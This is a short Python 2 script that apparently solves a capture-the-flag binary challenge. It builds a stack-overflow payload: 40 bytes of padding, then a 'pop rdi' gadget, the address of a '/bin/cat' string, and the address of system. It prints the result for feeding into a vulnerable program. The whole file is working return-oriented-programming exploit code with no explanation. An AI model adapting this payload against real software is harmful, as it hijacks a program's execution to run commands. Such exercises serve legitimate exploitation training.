import struct 

buf = 'A'*40 
buf += struct.pack('<Q',0x400883)#poprdi 
buf += struct.pack('<Q',0x601060)#/bin/cat string 
buf += struct.pack('<Q',0x400810)#system offset

print buf 
